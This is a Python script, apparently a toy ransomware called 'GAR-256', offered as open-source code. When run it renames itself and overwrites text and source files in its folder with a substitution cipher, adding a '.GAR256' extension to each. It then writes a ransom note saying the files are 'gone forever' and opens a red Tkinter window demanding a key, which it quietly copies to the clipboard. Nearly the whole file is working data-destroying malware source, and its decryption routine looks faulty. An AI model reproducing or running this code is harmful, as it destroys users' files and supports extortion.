import hashlib
import math
import string
import random
from tkinter import *
from pathlib import Path
import os
from time import sleep
from tkinter import messagebox
import pyperclip
import socket
from threading import Thread

#Data

keyLength = 256 // 8

#Code

StoredKey = "" #Encrpyt Key
char = [] #All Characters
storedkeylist = []
bytesc = str(random.randint(1000000000000000,9999999999999999999))
randName = hashlib.md5(bytes(bytesc, "ascii")).hexdigest() + ".py"
types = [".txt",".text",".bat",".py",".cs",".css",".cpp",".lua"]

print("Using GAR-EncryptionAlgorithem --V1.3 --By:2Depth --OpenSource-Version")

for dob in range(len(string.printable)):
    if string.printable[dob] != "\\":
        char.append(string.printable[dob])
    else:
        char.append("\\")
for kurrent in range(len(string.printable)):
    cd = ""
    for zurrent in range(keyLength):
        cd = cd + char[random.randint(0,len(string.printable)-4)]
    storedkeylist.append(cd)

for keyNum in range(len(string.printable)):
    StoredKey = StoredKey + str(storedkeylist[keyNum])

#Encrypt

def canEnc(name):
   for num in range(len(types)):
      if name.find(types[num]) != -1:
         return True
   return False

def encrypt(txt):
    started = txt
    returnData = ""
    for kurrentKey in range(len(txt)):
        kurrentChar = txt[kurrentKey]
        if kurrentChar in char:

            returnData = returnData + storedkeylist[char.index(kurrentChar)]
        else:
            print("Error Ascii : " + kurrentChar + " Not Found!")
    return  returnData

#Decryptor

def decrypt(keyInput,keyStrength,txt):
    char = []
    for dob in range(len(string.printable)):
        if string.printable[dob] != "\\":
            char.append(string.printable[dob])
        else:
            char.append("\\")

    keyUnpacked = []
    endReturn = ""
    for bob in range(len(storedkeylist)):
        rb = 1
        if bob == 0:
            rb = 0
        toappend = str(keyInput[keyStrength*bob:(keyStrength*bob)+keyStrength])
        keyUnpacked.append(toappend)

    for bob in range(math.floor(len(txt)/keyStrength)):
        rb = 1
        if bob == 0:
            rb = 0
        cd = txt[keyStrength*bob:(keyStrength*bob)+keyStrength]
        print(cd)
        if cd:
            fr = keyUnpacked.index(cd)
            if fr:
                endReturn = endReturn + char[fr]
            else:
                break
        else:
            break
    return endReturn






key = StoredKey #Gets Stored Key And Renames To 'Key'
length = keyLength #Renames KeyLength into 'length'

#Your Code:

ods = "Linux"

print("User is using a " + ods + " host, file parented To " + Path(__file__).parent.name + "; Collecting Data...")
fils = os.listdir(Path(__file__).parent)
sleep(1)
print("Found Data! || ")
print(fils)
sleep(1)

def hash(fils,fl):
    padir = str(Path(__file__).parent) + "/"
    toEncFlW = Path(padir+ "/" + fils[fl])
    daya = str(toEncFlW.read_text())
    cd = encrypt(daya)
    toEncFlW.write_text(cd)
    os.rename(str(padir + fils[fl]),str(padir + fils[fl]) + ".GAR" + str(length))
    print("Hashed : " + Path(padir + fils[fl]).name)

def dehash(fils,fl):
    padir = str(Path(__file__).parent) + "/"
    toEncFlW = Path(padir+ "/" + fils[fl])
    daya = toEncFlW.read_text()
    cd = decrypt(key,length,daya)
    toEncFlW.write_text(cd)
    os.rename(str(padir + fils[fl]),str(padir + fils[fl].replace(".GAR" + str(length),"")))
    print("Unhashed : " + Path(padir + fils[fl]).name)

if ods == "Linux":
    os.rename(str(Path(__file__)),str(Path(__file__).parent) + "/" + randName)
    fils = os.listdir(Path(__file__).parent)
    for fl in range(len(fils)):
        if fils[fl] != randName:
            if canEnc(fils[fl]) == True:
                th = Thread(target=hash,args=(fils,fl,))
                th.start()

else:
    os.rename(str(Path(__file__)),str(Path(__file__).parent) + "\\" + randName)
    fils = os.listdir(Path(__file__).parent)
    for fl in range(len(fils)):
        if fils[fl] != randName:
            if canEnc(fils[fl]) == True:
                padir = str(Path(__file__).parent) + "\\"
                toEncFlW = Path(padir+ "\\" + fils[fl])
                daya = toEncFlW.read_text()
                cd = encrypt(daya)
                toEncFlW.write_text(cd)
                os.rename(str(padir + fils[fl]),str(padir + fils[fl]) + ".GAR" + str(length))

            print("Hashed : " + Path(padir + fils[fl]).name)


open("GAR.txt","a")
open("GAR.txt","w").write("All of your files have been encrypted with GAR-" + str(length) + " , Your files are gone forever. Unless, you Decrypt them here: [Dead link]")
base = Tk()


label = Label(base,text = "Your files have been encrypted with GAR-256\nEnter key Below",bg="red",border=0,foreground="white",font="SourceSansBold")

put = Entry(base,width=20,bg="gray",border=0,foreground="black",background="white")
def check():
    if put.get() == key:
        messagebox.showinfo("Correct","Correct Key!")
        if ods == "Linux":
            fils = os.listdir(Path(__file__).parent)
            for fl in range(len(fils)):
                if fils[fl] != randName:
                    if fils[fl].find(".GAR") != -1:

                        thh = Thread(target=dehash,args=(fils,fl,))
                        thh.start()
        else:
            fils = os.listdir(Path(__file__).parent)
            for fl in range(len(fils)):
                if fils[fl] != randName:
                    if canEnc(fils[fl]) == True & fils[fl].find(".GAR") != -1:
                        padir = str(Path(__file__).parent) + "\\"
                        toEncFlW = Path(padir+ "\\" + fils[fl])
                        daya = str(toEncFlW.read_text())
                        cd = str(decrypt(key,length,daya))
                        toEncFlW.write_text(cd)
                        os.rename(str(padir + fils[fl]),str(padir + fils[fl].replace(".GAR" + str(length),"")))

                        print("Unhashed : " + Path(padir + fils[fl]).name)
        base.destroy()
        os.remove("GAR.txt")

    else:
        messagebox.showerror("Failed","Wrong key!")

button = Button(base,text="Continue",command=check,border=0,bg="dark gray",fg="white")
local = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
local.connect(("8.8.8.8",80))
oks = "Windows"

if str(Path(__file__)).find("/") != -1:
    oks = "Linux"

base.title("{os=" + oks + ",user=Administrator" + ",ip=" + "}")
base.geometry('427x250')
#base.title("GAR-256 MESSAGE _DATA_={os=" + oks + "}")
label.place(x=40,y=40)
button.place(x=170,y=150)
put.place(x=130,y=200)
base.configure(bg="red")
for fl in range(len(fils)):
        if fils[fl] != randName:
            if canEnc(fils[fl]) == True:
                label2 = Label(base,text = "Encrypted " + fils[fl],bg="black",fg="white")
                label2.grid(row=0,column=fl+1)
pyperclip.copy(key)
base.mainloop()
